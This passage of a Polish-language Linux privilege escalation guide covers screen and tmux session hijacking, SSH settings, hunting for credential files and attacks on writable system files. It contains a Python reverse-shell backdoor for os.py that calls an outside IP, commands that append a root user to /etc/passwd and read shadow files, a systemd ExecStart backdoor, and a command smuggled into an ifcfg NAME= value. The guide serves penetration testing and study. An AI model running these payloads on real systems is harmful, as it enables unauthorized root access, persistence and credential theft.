Dostęp do sesji GNU Screen innych użytkowników zależy od **konfiguracji i ACL uruchomionej sesji**, a nie tylko od jej wersji. [Dokumentacja GNU Screen](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) informuje, że program musi być skompilowany z obsługą wielu użytkowników; ustawienie `multiuser on` oraz uprawnienie przyznane przez `acladd` lub odpowiednie `aclchg` pozwalają innemu użytkownikowi dołączyć do sesji. [Podręcznik wymaga również bitu setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) na potrzeby wyszukiwania sesji między użytkownikami. Widoczny socket należący do roota ani sam plik binarny `screen` z SUID nie potwierdzają, że można dołączyć do powłoki roota. Zanim uznasz to za eskalację uprawnień, sprawdź, czy aktywna sesja obsługuje wielu użytkowników, bieżący użytkownik ma efektywne uprawnienia do wprowadzania danych lub wykonywania poleceń, a powłoka w tej sesji działa jako użytkownik o podwyższonych uprawnieniach.

### Przechwytywanie sesji screen

**Wyświetlanie sesji screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![przejmowanie sesji screen - Lokalizacje gniazd (niektóre systemy udostępniają jedno jako dowiązanie symboliczne do drugiego): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Dołącz do sesji**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## Przejmowanie sesji tmux

Był to problem **starszych wersji tmux**. Nie udało mi się przejąć sesji tmux (v2.1) utworzonej przez roota jako użytkownik bez uprawnień.

**Wyświetlanie sesji tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Lokalizacje socketów (niektóre systemy udostępniają jeden jako symlink drugiego) - hijacking sesji tmux: tmux -S /tmp/dev sess ls Wyświetl listę, używając tego socketu; możesz uruchomić sesję tmux na tym sockecie...](<../../images/image (837).png>)

**Dołącz do sesji**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Sprawdź **Valentine box from HTB**, aby zobaczyć przykład.

## SSH

### Przewidywalny PRNG OpenSSL w Debianie - CVE-2008-0166

Klucze wygenerowane przy użyciu podatnych kompilacji OpenSSL w Debianie lub jego pochodnych w historycznym okresie podatności mogą mieć przewidywalną losowość; obecna dystrybucja hosta ani załatana wersja OpenSSL nie pozwalają ustalić, jak wygenerowano starszy klucz. Sprawdź **konkretny klucz** przy użyciu odpowiedniej historycznej czarnej listy i zweryfikuj jego pochodzenie. Podręcznik Debiana [`ssh-vulnkey`](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) opisuje sprawdzanie kluczy publicznych i plików `authorized_keys`, a [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) zawiera informacje o poprawce OpenSSL. Wpis w pliku `authorized_keys` uprzywilejowanego konta jest tropem prowadzącym do eskalacji tylko wtedy, gdy odpowiadający mu klucz prywatny można odzyskać, a obowiązująca polityka SSH nadal akceptuje ten klucz dla tego konta; słaby klucz **hosta** sam w sobie nie jest poświadczeniem logowania. Wymień przejęte klucze i usuń ich wcześniejsze autoryzacje.

### Interesujące wartości konfiguracji SSH

- **PasswordAuthentication:** Określa, czy dozwolone jest uwierzytelnianie hasłem. Domyślna wartość w upstream OpenSSH to `yes`; konfiguracja dystrybucji może ją zmienić.
- **PubkeyAuthentication:** Określa, czy dozwolone jest uwierzytelnianie kluczem publicznym. Wartość domyślna to `yes`.
- **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer zezwala na logowanie na konta z pustym hasłem. Wartość domyślna to `no`.

### Pliki kontroli logowania

Te pliki wpływają na to, kto i w jaki sposób może się logować:

- **`/etc/nologin`**: jeśli istnieje, blokuje logowanie użytkowników innych niż root i wyświetla swoją treść.
- **`/etc/securetty`**: ogranicza miejsca, z których root może się logować (lista dozwolonych TTY).
- **`/etc/motd`**: baner wyświetlany po zalogowaniu (może ujawnić informacje o środowisku lub szczegóły prac konserwacyjnych).

### PermitRootLogin

Określa, czy root może logować się przez ssh. Domyślna wartość w upstream OpenSSH to `prohibit-password`; konfiguracja dystrybucji może ją zmienić. Możliwe wartości:

- `yes`: root może logować się przy użyciu hasła i klucza prywatnego
- `without-password` lub `prohibit-password`: root może logować się tylko przy użyciu klucza prywatnego
- `forced-commands-only`: root może logować się tylko przy użyciu klucza prywatnego i jeśli określono opcje commands
- `no` : nie

### Zaufane urzędy certyfikacji użytkowników SSH

`TrustedUserCAKeys` wskazuje klucze publiczne, którym sshd ufa przy podpisywaniu certyfikatów **użytkowników**. Jeśli odpowiadający im prywatny klucz CA jest dostępny do odczytu dla użytkownika o niższych uprawnieniach, sprawdź, kto może uzyskać certyfikat i jako które nazwy principal może się uwierzytelnić. `AuthorizedPrincipalsFile` lub `AuthorizedPrincipalsCommand` mogą ograniczać akceptowane nazwy; jeśli nie skonfigurowano żadnego z nich, certyfikat musi zawierać nazwę docelowego konta. `PermitRootLogin prohibit-password` blokuje uwierzytelnianie roota hasłem, ale może nadal zezwalać na uwierzytelnianie certyfikatem. Sama ujawniona ścieżka do klucza nie dowodzi dostępu: potwierdź parę kluczy publicznego i prywatnego, obowiązujące reguły `Match`, politykę konta, hasło klucza, unieważnienie oraz akceptowane algorytmy podpisu. Nie umieszczaj bajtów kluczy prywatnych w wynikach enumeracji. Zobacz [podręcznik konfiguracji serwera OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Prywatny klucz CA może być również użyteczny **bez możliwości odczytu** przez bieżącego użytkownika, jeśli reguła delegowania uprawnień pozwala temu użytkownikowi wywołać nieograniczony [program do podpisywania certyfikatów, taki jak `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s), z tożsamością właściciela klucza. Powiąż dokładnie dozwolone polecenie i argumenty z dostępem konta podpisującego do klucza, zaufanym kluczem publicznym CA w obowiązującej konfiguracji sshd, principal akceptowanym dla konta docelowego, okresem ważności certyfikatu oraz polityką logowania tego konta. Delegowane polecenie podpisujące ani sam zaufany plik CA nie dowodzą dostępu do innego konta; podczas pasywnej enumeracji nie podpisuj testowego certyfikatu.

### AuthorizedKeysFile

Określa pliki zawierające klucze publiczne, których można używać do uwierzytelniania użytkowników. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Można podać ścieżki bezwzględne** (zaczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Ta konfiguracja oznacza, że jeśli spróbujesz zalogować się przy użyciu **klucza prywatnego** użytkownika „**testusername**”, ssh porówna klucz publiczny z Twojego klucza z kluczami znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Przekazywanie agenta SSH pozwala **używać lokalnych kluczy SSH zamiast pozostawiać klucze** (bez haseł!) na serwerze. Dzięki temu możesz przez SSH **połączyć się z hostem**, a następnie **przejść z niego na kolejny host**, **używając** **klucza** znajdującego się na Twoim **początkowym hoście**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w następujący sposób:

```
Host example.com
  ForwardAgent yes
```

Zwróć uwagę, że jeśli `Host` ma wartość `*`, za każdym razem, gdy użytkownik łączy się z inną maszyną, jej host będzie mógł uzyskać dostęp do kluczy (co stanowi zagrożenie dla bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisywać** te **opcje** i zezwalać na tę konfigurację lub jej zabraniać.\
Plik `/etc/sshd_config` może **zezwalać** na przekazywanie ssh-agent lub go **zabraniać** za pomocą słowa kluczowego `AllowAgentForwarding` (domyślnie jest ono dozwolone).

Jeśli okaże się, że w danym środowisku skonfigurowano Forward Agent, zapoznaj się z poniższą stroną, ponieważ **możesz być w stanie wykorzystać tę funkcję do eskalacji uprawnień**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interesujące pliki

### Pliki profili

Plik `/etc/profile` i pliki znajdujące się w `/etc/profile.d/` to **skrypty uruchamiane, gdy użytkownik otwiera nową powłokę**. Dlatego jeśli możesz **zapisywać w którymkolwiek z nich lub go modyfikować, możesz eskalować uprawnienia**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Jeśli zostanie znaleziony jakiś dziwny skrypt profilu, należy sprawdzić, czy zawiera **poufne informacje**.

### Pliki Passwd/Shadow

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inne nazwy lub mogą istnieć ich kopie zapasowe. Dlatego zaleca się **znaleźć je wszystkie** i **sprawdzić, czy można je odczytać**, aby ustalić, **czy zawierają hashe**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

W niektórych przypadkach w pliku `/etc/passwd` (lub jego odpowiedniku) można znaleźć **hashe haseł**.

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Zapisywalny /etc/passwd

Najpierw wygeneruj hasło za pomocą jednego z poniższych poleceń.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Następnie dodaj użytkownika `hacker` i ustaw wygenerowane hasło.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Np.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Możesz teraz użyć polecenia `su`, podając `hacker:hacker`

Możesz też użyć poniższych wierszy, aby dodać fikcyjnego użytkownika bez hasła.\
OSTRZEŻENIE: może to obniżyć obecny poziom zabezpieczeń maszyny.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

UWAGA: Na platformach BSD `/etc/passwd` znajduje się w plikach `/etc/pwd.db` i `/etc/master.passwd`, a `/etc/shadow` ma nazwę `/etc/spwd.db`.

Sprawdź, czy możesz **zapisywać do wrażliwych plików**. Na przykład, czy możesz zapisywać do jakiegoś **pliku konfiguracyjnego usługi**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Na przykład, jeśli na maszynie działa serwer **tomcat** i możesz **zmodyfikować plik konfiguracji usługi Tomcat w /etc/systemd/,** możesz zmodyfikować wiersze:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Twój backdoor zostanie uruchomiony przy następnym uruchomieniu Tomcata.

### Sprawdź katalogi

W następujących katalogach mogą znajdować się kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie uda Ci się odczytać ostatniego, ale spróbuj)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Nietypowe lokalizacje/pliki należące do użytkownika

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Zmodyfikowane pliki w ciągu ostatnich minut

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Pliki baz danych SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

W czytelnych bazach danych aplikacji sprawdź nazwy tabel i kolumn pod kątem nazw użytkowników oraz hashy haseł. Znalezienie hasha, odzyskanie hasła i potwierdzenie jego ponownego użycia na koncie lokalnym to odrębne kroki; sam 32-znakowy ciąg szesnastkowy nie wystarczy, by uznać go za MD5 ani wywnioskować, że zapewnia dostęp do konta.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Jeśli czytelna historia powłoki zawiera polecenie `sudo`, po którym następuje krótka linia przypominająca hasło, ręcznie sprawdź sąsiednie linie. Hasło wpisane w zwykłym monicie `sudo` nie jest zapisywane w historii powłoki; kolejna linia to jedynie możliwy przypadkowy wpis w powłoce, a nie dowód na prawidłowe hasło. Znacznik `.sudo_as_admin_successful` odnotowuje wcześniejsze użycie, a nie aktualne uprawnienia.

### Ukryte pliki

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Skrypty/pliki binarne w PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Pliki WWW**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Kopie zapasowe**

Sprawdzaj czytelne pliki w katalogach kopii zapasowych, a także pliki, których **nazwy** zawierają `backup`: archiwum o nieczytelnej nazwie lub z zaszyfrowanym rozszerzeniem nadal może ujawniać stare dane aplikacji. Zaszyfrowane archiwum jest jedynie potencjalnym źródłem wycieku. Odzyskanie hasła, sprawdzenie jego zawartości, odzyskanie hasha aplikacji i ponowne użycie tego hasła na koncie Unix to odrębne kroki, które należy zweryfikować; hash w archiwum nie dowodzi, że można zalogować się lokalnie.

Czytelne kopie zapasowe maszyn wirtualnych również wymagają sprawdzenia. Konfiguracja VirtualBox `.vbox` może wskazywać dołączone obrazy `.vdi` i zawierać metadane klucza do zaszyfrowanego dysku; [dokumentacja VirtualBox wyjaśnia, że zaszyfrowany klucz danych jest przechowywany w konfiguracji maszyny wirtualnej](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Zarówno konfiguracja, jak i obraz muszą być dostępne, aby można było przeprowadzić analizę dysku offline. Wolumin gościa może mieć własną [warstwę szyfrowania LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), wymagającą osobnego klucza. Nawet po autoryzowanym odszyfrowaniu stare skrypty lub konfiguracja mogą zawierać hasło; zanim uznasz to za lokalne podniesienie uprawnień, ustal, czy dane uwierzytelniające są aktualne dla konta na hoście i czy efektywna polityka `sudo` pozwala na wykonanie polecenia z uprawnieniami uprzywilejowanymi. Podczas pasywnej enumeracji zinwentaryzuj ścieżki i uprawnienia, nie kopiując, nie odszyfrowując ani nie montując obrazów.

Podczas sprawdzania czytelnego archiwum najpierw wyświetl nazwy jego plików, zanim cokolwiek wypakujesz: mogą się w nim znajdować ukryte pliki uwierzytelniające, materiały z kodami odzyskiwania lub klucze SSH, nawet jeśli ich aktywne kopie są chronione. Same nazwy plików wskazują jedynie trop; osobno zweryfikuj materiały i ewentualne ponowne użycie danych uwierzytelniających.

W pierwszej kolejności sprawdzaj **czytelne archiwa należące do innego użytkownika** w katalogach kopii zapasowych, zwłaszcza archiwa należące do roota i dostępne dzięki członkostwu w grupie. Stare archiwum może zawierać konfigurację lub sekret uwierzytelniający, nawet jeśli aktywna kopia jest chroniona. W przypadku lokalnego interfejsu kopii zapasowych, takiego jak [Backrest](https://garethgeorge.github.io/backrest/), sprawdź efektywne konto usługi oraz to, czy użytkownik z niższymi uprawnieniami może odczytać jej konfigurację lub uwierzytelnić się w interfejsie. Jego [hooki](https://garethgeorge.github.io/backrest/docs/hooks) i [interfejs poleceń restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) mogą działać z uprawnieniami usługi do plików i poleceń; sam nasłuch na loopback nie przesądza o skutkach. `passwordBcrypt` w Backrest to zakodowany w base64 hash bcrypt w jego [kodzie uwierzytelniania](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), a nie hasło w postaci jawnej. Zanim uznasz ujawnione archiwum lub interfejs za granicę uprawnień, potwierdź tożsamość usługi, możliwość użycia danych uwierzytelniających oraz dostęp do odpowiedniego planu lub repozytorium.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Znane pliki zawierające hasła

Zapoznaj się z kodem [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), który wyszukuje **różne pliki mogące zawierać hasła**.\
**Innym interesującym narzędziem**, którego możesz użyć, jest [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — aplikacja open source służąca do odzyskiwania wielu haseł zapisanych lokalnie na komputerach z systemem Windows, Linux lub Mac.

Jeśli możesz odczytać `/etc/guacamole/guacamole.properties`, sprawdź ustawienia połączenia z bazą danych `mysql-*`, `postgresql-*` lub `sqlserver-*`. Jeśli konto ma uprawnienia do odczytu tabel JDBC Guacamole, `guacamole_connection_parameter` może zawierać zapisane wartości SSH `username`, `password`, `private-key` lub `passphrase`. Zacznij od identyfikatorów połączeń i nazw parametrów, a następnie sprawdź tylko odpowiednie wiersze; zapisana wartość może być dynamicznym tokenem lub odwołaniem do vaulta, a nie możliwym do ponownego użycia sekretem. Zobacz [schemat JDBC Guacamole](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) i [parametry połączenia SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

[Menadżer haseł pswm](https://github.com/Julynx/pswm#usage) domyślnie przechowuje zaszyfrowany vault w `~/.local/share/pswm/pswm`. Jeśli widzisz vault innego użytkownika, sprawdź jego właściciela oraz to, czy Twoje konto może go faktycznie odczytać. Sama ścieżka do vaulta nie ujawnia poświadczeń; odzyskanie jego hasła głównego, znalezienie hasła do konta, którego można użyć ponownie, i potwierdzenie uprawnień tego konta to osobne kroki.

[Domyślna baza danych Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) znajduje się w `~/.passpie/`; zawiera pęk kluczy `.keys` oraz zaszyfrowane pliki poświadczeń `.pass` w katalogach grup. Widoczny katalog bazy danych to jedynie wskazówka dotycząca ścieżki: potwierdź dostęp do klucza i odpowiedniego zaszyfrowanego wpisu, sprawdź, czy wymagane jest hasło główne, i ustal, czy odzyskane poświadczenie należy do konta o wyższych uprawnieniach. Passpie obsługuje także [niestandardowe ścieżki baz danych](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), więc domyślna ścieżka nie obejmuje wszystkich możliwości. Automatyczne wyliczanie powinno wyświetlać metadane bez eksportowania poświadczeń ani drukowania materiału kluczowego.

### Dzienniki

Jeśli możesz odczytywać dzienniki, możesz znaleźć w nich **interesujące/poufne informacje**. Im bardziej nietypowy dziennik, tym ciekawszy będzie (prawdopodobnie).\
Ponadto niektóre „**źle**” skonfigurowane (lub z backdoorem?) **dzienniki audytu** mogą umożliwiać **zapisywanie haseł** w dziennikach audytu, jak wyjaśniono w tym wpisie: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Aby **odczytywać logi, grupa** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) będzie bardzo pomocna.

### Pliki powłoki

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Ogólne wyszukiwanie danych uwierzytelniających/wyrażenia regularne

Sprawdź też pliki zawierające słowo „**password**” w **nazwie** lub treści, a także poszukaj adresów IP i e-maili w logach oraz wyrażeń regularnych dla hashy.\
Nie będę tutaj opisywać, jak to wszystko zrobić, ale jeśli Cię to interesuje, możesz sprawdzić ostatnie kontrole wykonywane przez [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki z prawem zapisu

### Python library hijacking

Jeśli wiesz, **skąd** zostanie uruchomiony skrypt Pythona, i **możesz zapisywać w** tym folderze albo modyfikować biblioteki Pythona, możesz zmodyfikować bibliotekę systemową i dodać do niej backdoor (jeśli możesz zapisywać w folderze, z którego zostanie uruchomiony skrypt Pythona, skopiuj i wklej bibliotekę os.py).

Aby **dodać backdoor do biblioteki**, dodaj na końcu biblioteki os.py poniższą linię (zmień IP i PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Wykorzystanie logrotate

Uprzywilejowane zadanie `logrotate` może umożliwić zapis pliku należącego do innego użytkownika, jeśli podczas rotacji faktycznie rotuje log znajdujący się w katalogu, który użytkownik o niższych uprawnieniach może podmienić lub przekierować. Sam zapis do logu to tylko wskazówka. Sprawdź dokładną aktywną regułę oraz dyrektywy `create`, `olddir` i `su`; efektywną tożsamość procesu harmonogramu; prawa zapisu i wyszukiwania w katalogu nadrzędnym logu; a także to, czy zainstalowana wersja i jej polityka pozwalają na zmianę lokalizacji docelowej. Aby zapis do pliku startowego doprowadził do wykonania poleceń, późniejsza uprzywilejowana powłoka musi też wczytać utworzony plik. Sprawdź harmonogram, regułę, wersję i sposób pakowania oraz metadane ścieżki — nie uruchamiaj rotacji ani nie próbuj wyścigu.

> [!TIP]
> Nie traktuj `3.18.0` ani żadnego innego numeru wersji jako samodzielnej granicy podatności. [Dziennik zmian upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) odnotowuje wprowadzanie zabezpieczeń katalogów i symlinków w kilku wydaniach, a dystrybucje mogą przenosić poprawki do starszych wersji. [Podręcznik upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) zaleca użycie `su`, gdy root rotuje logi w katalogach kontrolowanych przez użytkowników nieuprzywilejowanych; zweryfikuj faktycznie używaną regułę i zachowanie.

Więcej informacji o podatności znajdziesz na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Tę podatność można wykorzystać za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta podatność jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logi nginx),** więc gdy tylko odkryjesz, że możesz modyfikować logi, sprawdź, kto nimi zarządza i czy możesz eskalować uprawnienia, zastępując logi symlinkami.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Odwołanie do podatności:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Plik `ifcfg-*` jest wskazówką wartą sprawdzenia, gdy użytkownik o niższych uprawnieniach może go utworzyć lub zmodyfikować **i** uprzywilejowana ścieżka aktywacji sieci odczytuje właśnie ten plik. Sprawdź efektywne uprawnienia do pliku i katalogu, wybrany interfejs, zainstalowaną implementację `ifup`/`ifdown` oraz to, kto ją wywołuje. Sam zapis do pliku nie powoduje wykonania kodu. [Przewodnik sieciowy Red Hat dla RHEL 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) rozróżnia starsze skrypty sieciowe od NetworkManager: ten drugi sam z siebie nie uruchamia tych pierwszych. [Dokumentacja RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) informuje, że domyślne `ifup`/`ifdown` korzystają z NetworkManager, natomiast opcjonalny pakiet starszych skryptów dostarcza skrypty powłoki.

W systemie, który faktycznie korzysta z uprzywilejowanych starszych skryptów, nieujęte w cudzysłów przypisanie z pliku `ifcfg-*`, wczytywanego przez powłokę, takie jak `NAME=`, może przekroczyć granicę prowadzącą do wykonania kodu. Zweryfikuj dokładny parser, wartość i ścieżkę aktywacji; nie zakładaj interpretacji przez powłokę na podstawie samej nazwy pliku ani obecności NetworkManager. Wrapper dozwolony przez sudo, który zapisuje dane wejściowe użytkownika do pliku `ifcfg-*`, a następnie wywołuje starsze `ifup`, stanowi odrębną ścieżkę do tej granicy — nawet jeśli użytkownik nie może bezpośrednio modyfikować pliku.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Zwróć uwagę na spację między Network a /bin/id_)

### **init, init.d, systemd i rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linuksie**. Znajdują się w nim skrypty do `start`, `stop`, `restart`, a czasem także `reload` usług. Można je uruchamiać bezpośrednio lub za pośrednictwem dowiązań symbolicznych znajdujących się w `/etc/rc?.d/`. W systemach Redhat alternatywną ścieżką jest `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest powiązany z **Upstart**, nowszym systemem **zarządzania usługami** wprowadzonym przez Ubuntu, który wykorzystuje pliki konfiguracyjne do zarządzania usługami. Mimo przejścia na Upstart skrypty SysVinit są nadal używane równolegle z konfiguracjami Upstart dzięki warstwie zgodności w Upstart.

**systemd** to nowoczesny system inicjalizacji i menedżer usług, oferujący zaawansowane funkcje, takie jak uruchamianie daemonów na żądanie, zarządzanie automount oraz migawki stanu systemu. Porządkuje pliki w katalogu `/usr/lib/systemd/` dla pakietów dystrybucji oraz w `/etc/systemd/system/` dla zmian wprowadzanych przez administratora, usprawniając zarządzanie systemem.<sup>[[21]](#references)</sup>

## Inne triki

### Eskalacja uprawnień przez NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Ucieczka z ograniczonych powłok


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Frameworki do rootowania Androida: nadużycie kanału managera

Frameworki do rootowania Androida często hookują syscall, aby udostępnić managerowi działającemu w userspace uprzywilejowane funkcje jądra. Słabe uwierzytelnianie managera (np. kontrole sygnatur oparte na kolejności FD lub słabe schematy haseł) może umożliwić lokalnej aplikacji podszycie się pod managera i uzyskanie uprawnień root na urządzeniach, które zostały już zrootowane. Więcej informacji i szczegóły exploita znajdziesz tutaj:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Wykrywanie usług VMware Tools i LPE (CWE-426) przez exec oparte na regex (CVE-2025-41244)

Wykrywanie usług oparte na regex w VMware Tools/Aria Operations może wyodrębnić ścieżkę do pliku binarnego z wierszy poleceń procesów i uruchomić ten plik z argumentem -v w kontekście uprzywilejowanym. Liberalne wzorce (np. używające \S) mogą dopasować przygotowane przez atakującego listenery w lokalizacjach z prawem zapisu (np. /tmp/httpd), co może prowadzić do wykonania kodu jako root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Więcej informacji oraz uogólniony wzorzec, który można zastosować w innych stosach wykrywania i monitorowania, znajdziesz tutaj:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Zabezpieczenia jądra

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
